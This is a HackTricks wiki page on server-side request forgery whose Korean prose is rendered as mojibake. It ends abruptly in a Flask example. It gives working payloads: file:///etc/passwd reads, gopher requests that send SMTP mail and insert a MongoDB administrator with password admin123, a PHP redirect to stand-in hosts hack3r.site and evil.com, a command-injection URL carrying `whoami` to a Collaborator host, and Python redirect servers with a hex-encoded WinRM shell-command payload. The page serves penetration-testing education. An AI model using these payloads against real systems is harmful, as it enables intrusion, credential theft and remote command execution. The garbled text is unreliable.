# SSRF (Server Side Request Forgery)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥** **ê³ ê¸‰** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•** ë° **ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ì˜ AWS í•´í‚¹**ì„ ë°°ìš°ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬** [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œë¡œ **PRì„ ì œì¶œ**í•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

**ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡° (SSRF)** ì·¨ì•½ì ì€ ê³µê²©ìê°€ **ì„œë²„ ì¸¡ ì‘ìš© í”„ë¡œê·¸ë¨**ì„ ì¡°ì‘í•˜ì—¬ ê³µê²©ìê°€ ì„ íƒí•œ ë„ë©”ì¸ìœ¼ë¡œ **HTTP ìš”ì²­**ì„ ìˆ˜í–‰í•˜ë„ë¡ í•˜ëŠ” ê²½ìš° ë°œìƒí•©ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ê³µê²©ìê°€ ì§€ì‹œí•œ ì„ì˜ì˜ ì™¸ë¶€ ìš”ì²­ì„ ì„œë²„ì— ë…¸ì¶œì‹œí‚µë‹ˆë‹¤.

## SSRF ìº¡ì²˜

ë¨¼ì € ìˆ˜í–‰í•œ SSRF ìƒí˜¸ ì‘ìš©ì„ ìº¡ì²˜í•´ì•¼ í•©ë‹ˆë‹¤. HTTP ë˜ëŠ” DNS ìƒí˜¸ ì‘ìš©ì„ ìº¡ì²˜í•˜ë ¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **Burp Collaborator**
* [**pingb**](http://pingb.in)
* [**canarytokens**](https://canarytokens.org/generate)
* [**interractsh**](https://github.com/projectdiscovery/interactsh)
* [**http://webhook.site**](http://webhook.site)
* [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
* [http://requestrepo.com/](http://requestrepo.com/)
* [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
* [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - ngrokë¥¼ ì‚¬ìš©í•˜ëŠ” Burp Collaborator

## í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ëœ ë„ë©”ì¸ ìš°íšŒ

ë³´í†µ SSRFê°€ **íŠ¹ì • í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ëœ ë„ë©”ì¸**ì´ë‚˜ URLì—ì„œë§Œ ì‘ë™í•˜ëŠ” ê²ƒì„ ë°œê²¬í•  ê²ƒì…ë‹ˆë‹¤. ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” í•´ë‹¹ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•œ **ê¸°ìˆ  ëª¨ìŒ**ì„ ì œê³µí•©ë‹ˆë‹¤:

{% content-ref url="url-format-bypass.md" %}
[url-format-bypass.md](url-format-bypass.md)
{% endcontent-ref %}

### ì˜¤í”ˆ ë¦¬ë””ë ‰íŠ¸ë¥¼ í†µí•œ ìš°íšŒ

ì„œë²„ê°€ ì˜¬ë°”ë¥´ê²Œ ë³´í˜¸ë˜ì–´ ìˆë‹¤ë©´ ì›¹ í˜ì´ì§€ ë‚´ë¶€ì˜ **ì˜¤í”ˆ ë¦¬ë””ë ‰íŠ¸ë¥¼ ì´ìš©í•˜ì—¬ ëª¨ë“  ì œí•œì„ ìš°íšŒ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›¹ í˜ì´ì§€ëŠ” **ë™ì¼í•œ ë„ë©”ì¸ìœ¼ë¡œì˜ SSRFë¥¼ í—ˆìš©**í•˜ê³  ì•„ë§ˆë„ **ë¦¬ë””ë ‰íŠ¸ë¥¼ ë”°ë¥¼ ê²ƒ**ì´ë¯€ë¡œ **ë‚´ë¶€ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ë„ë¡ ì„œë²„ë¥¼ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
ìì„¸í•œ ë‚´ìš©ì€ ì—¬ê¸°ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## í”„ë¡œí† ì½œ

* **file://**
* `file://` URL schemeì€ `/etc/passwd`ë¡œ ì§ì ‘ ê°€ë¦¬í‚µë‹ˆë‹¤: `file:///etc/passwd`
* **dict://**
* DICT URL schemeì€ DICT í”„ë¡œí† ì½œì„ í†µí•´ ì •ì˜ ë˜ëŠ” ë‹¨ì–´ ëª©ë¡ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤ê³  ì„¤ëª…ë©ë‹ˆë‹¤. íŠ¹ì • ë‹¨ì–´, ë°ì´í„°ë² ì´ìŠ¤ ë° í•­ëª© ë²ˆí˜¸ë¥¼ ëŒ€ìƒìœ¼ë¡œ í•˜ëŠ” êµ¬ì„±ëœ URL ë° PHP ìŠ¤í¬ë¦½íŠ¸ì˜ ì˜ëª»ëœ ì‚¬ìš© ì‚¬ë¡€ê°€ ì œì‹œë˜ì—ˆìŠµë‹ˆë‹¤: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
* **SFTP://**
* ì•ˆì „í•œ ì…¸ì„ í†µí•œ ì•ˆì „í•œ íŒŒì¼ ì „ì†¡ì„ ìœ„í•œ í”„ë¡œí† ì½œë¡œ ì‹ë³„ë˜ë©°, PHP ìŠ¤í¬ë¦½íŠ¸ê°€ ì•…ì˜ì ì¸ SFTP ì„œë²„ì— ì—°ê²°í•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì£¼ëŠ” ì˜ˆì œê°€ ì œê³µë©ë‹ˆë‹¤: `url=sftp://generic.com:11111/`
* **TFTP://**
* UDP ìƒì—ì„œ ì‘ë™í•˜ëŠ” Trivial File Transfer Protocolì€ PHP ìŠ¤í¬ë¦½íŠ¸ê°€ TFTP ì„œë²„ë¡œ ìš”ì²­ì„ ë³´ë‚´ë„ë¡ ì„¤ê³„ëœ ì˜ˆì œë¡œ ì„¤ëª…ë©ë‹ˆë‹¤. 'generic.com'ì˜ '12346' í¬íŠ¸ë¡œ 'TESTUDPPACKET' íŒŒì¼ì— ëŒ€í•œ TFTP ìš”ì²­ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
* **LDAP://**
* ì´ ì„¸ê·¸ë¨¼íŠ¸ëŠ” IP ë„¤íŠ¸ì›Œí¬ ìƒì—ì„œ ë¶„ì‚° ë””ë ‰í„°ë¦¬ ì •ë³´ ì„œë¹„ìŠ¤ë¥¼ ê´€ë¦¬í•˜ê³  ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ê²½ëŸ‰ ë””ë ‰í„°ë¦¬ ì•¡ì„¸ìŠ¤ í”„ë¡œí† ì½œì„ ë‹¤ë£¨ë©°, ë¡œì»¬í˜¸ìŠ¤íŠ¸ì˜ LDAP ì„œë²„ì™€ ìƒí˜¸ ì‘ìš©í•˜ëŠ” ë°©ë²•ì„ ê°•ì¡°í•©ë‹ˆë‹¤: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
* **SMTP**
* SSRF ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ ë¡œì»¬í˜¸ìŠ¤íŠ¸ì˜ SMTP ì„œë¹„ìŠ¤ì™€ ìƒí˜¸ ì‘ìš©í•˜ëŠ” ë°©ë²•ì´ ì„¤ëª…ë˜ë©°, ë‚´ë¶€ ë„ë©”ì¸ ì´ë¦„ì„ ê³µê°œí•˜ê³  í•´ë‹¹ ì •ë³´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì¶”ê°€ ì¡°ì‚¬ ì¡°ì¹˜ë¥¼ ì·¨í•˜ëŠ” ë‹¨ê³„ê°€ í¬í•¨ë©ë‹ˆë‹¤.

```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```

* **Curl URL globbing - WAF bypass**
* ë§Œì•½ SSRFê°€ **curl**ì— ì˜í•´ ì‹¤í–‰ë˜ë©´, curlì€ WAFë¥¼ ìš°íšŒí•˜ëŠ” ë° ìœ ìš©í•œ [**URL globbing**](https://everything.curl.dev/cmdline/globbing)ì´ë¼ëŠ” ê¸°ëŠ¥ì„ ê°€ì§€ê³  ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì´ [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi)ì—ì„œ **`file` í”„ë¡œí† ì½œì„ í†µí•œ ê²½ë¡œ ìˆœíšŒ**ì˜ ì˜ˆì œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```

* **Gopher://**
* Gopher í”„ë¡œí† ì½œì˜ IP, í¬íŠ¸ ë° ë°”ì´íŠ¸ë¥¼ ì§€ì •í•˜ì—¬ ì„œë²„ í†µì‹ ì„ í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì— ëŒ€í•´ ì„¤ëª…í•˜ë©°, Gopherus ë° remote-method-guesserì™€ ê°™ì€ íˆ´ì„ ì‚¬ìš©í•˜ì—¬ í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•˜ëŠ” ë°©ë²•ì„ ë‹¤ë£¹ë‹ˆë‹¤. ë‘ ê°€ì§€ ë‹¤ë¥¸ ìš©ë„ê°€ ì„¤ëª…ë©ë‹ˆë‹¤:

### Gopher://

ì´ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ë©´ ì„œë²„ê°€ **ë³´ë‚´ë„ë¡ ì›í•˜ëŠ” IP, í¬íŠ¸ ë° ë°”ì´íŠ¸**ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ê¸°ë³¸ì ìœ¼ë¡œ SSRFë¥¼ ì´ìš©í•˜ì—¬ **ì–´ë–¤ TCP ì„œë²„ì™€ë„ í†µì‹ **í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë‹¤ë§Œ ë¨¼ì € ì„œë¹„ìŠ¤ì™€ ëŒ€í™”í•˜ëŠ” ë°©ë²•ì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤).\
ë‹¤í–‰íˆë„ [Gopherus](https://github.com/tarunkant/Gopherus)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ì„œë¹„ìŠ¤ì— ëŒ€í•œ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)ë¥¼ ì‚¬ìš©í•˜ì—¬ _Java RMI_ ì„œë¹„ìŠ¤ë¥¼ ìœ„í•œ _gopher_ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Gopher smtp**

```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```

**ê³ í¼ HTTP**

```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```

**Gopher SMTP â€” 1337ì— ë°± ì»¤ë„¥íŠ¸**

{% code title="redirect.php" %}
```php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
{% endcode %}

#### Gopher MongoDB -- ì‚¬ìš©ìë¥¼ ë§Œë“¤ì–´ username=admin, password=admin123 ë° permission=administratorìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.

```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```

## Referrer í—¤ë” ë° ê¸°íƒ€ë¥¼ í†µí•œ SSRF

ì„œë²„ì˜ ë¶„ì„ ì†Œí”„íŠ¸ì›¨ì–´ëŠ” ì¢…ì¢… Referrer í—¤ë”ë¥¼ ë¡œê¹…í•˜ì—¬ ë“¤ì–´ì˜¤ëŠ” ë§í¬ë¥¼ ì¶”ì í•˜ëŠ”ë°, ì´ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì„ SSRF ì·¨ì•½ì ì— ë…¸ì¶œì‹œí‚¤ëŠ” ì‹¤ìˆ˜ë¥¼ ì¼ìœ¼í‚µë‹ˆë‹¤. ì´ëŠ” í•´ë‹¹ ì†Œí”„íŠ¸ì›¨ì–´ê°€ Referrer í—¤ë”ì— ì–¸ê¸‰ëœ ì™¸ë¶€ URLì„ ë°©ë¬¸í•˜ì—¬ ì¶”ì²œ ì‚¬ì´íŠ¸ ì½˜í…ì¸ ë¥¼ ë¶„ì„í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ë°œê²¬í•˜ê¸° ìœ„í•´ \*\*Burp Suite í”ŒëŸ¬ê·¸ì¸ "Collaborator Everywhere"\*\*ë¥¼ í™œìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìœ¼ë©°, ì´ëŠ” ë¶„ì„ ë„êµ¬ê°€ Referer í—¤ë”ë¥¼ ì²˜ë¦¬í•˜ëŠ” ë°©ì‹ì„ í™œìš©í•˜ì—¬ ì ì¬ì ì¸ SSRF ê³µê²© í‘œë©´ì„ ì‹ë³„í•©ë‹ˆë‹¤.

## ì¸ì¦ì„œì—ì„œ SNI ë°ì´í„°ë¥¼ í†µí•œ SSRF

ì–´ë–¤ ë°±ì—”ë“œì—ë„ ì—°ê²°ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ëŠ” ì˜ëª»ëœ êµ¬ì„±ì€ ë‹¤ìŒê³¼ ê°™ì€ Nginx êµ¬ì„± ì˜ˆì œë¡œ ì„¤ëª…ë©ë‹ˆë‹¤:

```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```

ì´ êµ¬ì„±ì—ì„œëŠ” Server Name Indication (SNI) í•„ë“œì˜ ê°’ì´ ë°±ì—”ë“œ ì£¼ì†Œë¡œ ì§ì ‘ ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ì„¤ì •ì€ Server-Side Request Forgery (SSRF) ì·¨ì•½ì ì„ ë…¸ì¶œì‹œí‚¤ë©°, ë‹¨ìˆœíˆ SNI í•„ë“œì— ì›í•˜ëŠ” IP ì£¼ì†Œ ë˜ëŠ” ë„ë©”ì¸ ì´ë¦„ì„ ì§€ì •í•¨ìœ¼ë¡œì¨ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `internal.host.com`ê³¼ ê°™ì€ ì„ì˜ì˜ ë°±ì—”ë“œì— ì—°ê²°ì„ ê°•ì œí•˜ëŠ” ì•…ìš© ì˜ˆì‹œëŠ” ì•„ë˜ì— ì œê³µë©ë‹ˆë‹¤:

```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```

## [Wget íŒŒì¼ ì—…ë¡œë“œ](../file-upload/#wget-file-upload-ssrf-trick)

## ëª…ë ¹ ì‚½ì…ì„ ì‚¬ìš©í•œ SSRF

ë‹¤ìŒê³¼ ê°™ì€ payloadë¥¼ ì‹œë„í•´ë³¼ ê°€ì¹˜ê°€ ìˆìŠµë‹ˆë‹¤: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDF ë Œë”ë§

ì›¹ í˜ì´ì§€ê°€ ì œê³µí•œ ì •ë³´ë¡œ PDFë¥¼ ìë™ìœ¼ë¡œ ìƒì„±í•˜ëŠ” ê²½ìš°, PDF ìƒì„±ê¸°(ì„œë²„)ì—ì„œ ì‹¤í–‰ë  JSë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìœ¼ë©°, PDFë¥¼ ìƒì„±í•˜ëŠ” ë™ì•ˆ SSRFë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. [**ë” ë§ì€ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## SSRFì—ì„œ DoSë¡œ

ì—¬ëŸ¬ ì„¸ì…˜ì„ ìƒì„±í•˜ê³  ì„¸ì…˜ì—ì„œ SSRFë¥¼ ì´ìš©í•˜ì—¬ ë¬´ê±°ìš´ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤.

## SSRF PHP í•¨ìˆ˜

{% content-ref url="../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md" %}
[php-ssrf.md](../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md)
{% endcontent-ref %}

## Gopherë¡œì˜ SSRF ë¦¬ë””ë ‰ì…˜

ì¼ë¶€ ì•…ìš©ì„ ìœ„í•´ **ë¦¬ë””ë ‰íŠ¸ ì‘ë‹µì„ ë³´ë‚´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤** (ì•„ë§ˆë„ gopherì™€ ê°™ì€ ë‹¤ë¥¸ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŒ). ì—¬ê¸°ì— ë¦¬ë””ë ‰íŠ¸ ì‘ë‹µì„ ë°˜í™˜í•˜ëŠ” ë‹¤ì–‘í•œ íŒŒì´ì¬ ì½”ë“œê°€ ìˆìŠµë‹ˆë‹¤:

````python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
```html
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20
```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
````

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•** ë° **ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## SSRFë¥¼ ìœ„í•œ êµ¬ì„± ì˜¤ë¥˜ê°€ ìˆëŠ” í”„ë¡ì‹œ

[**ì´ ê²Œì‹œë¬¼ì—ì„œì˜**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) íŠ¸ë¦­.

### Flask

<details>

<summary>Flask í”„ë¡ì‹œ ì·¨ì•½ ì½”ë“œ</summary>

\`\`\`python from flask import Flask from requests import get

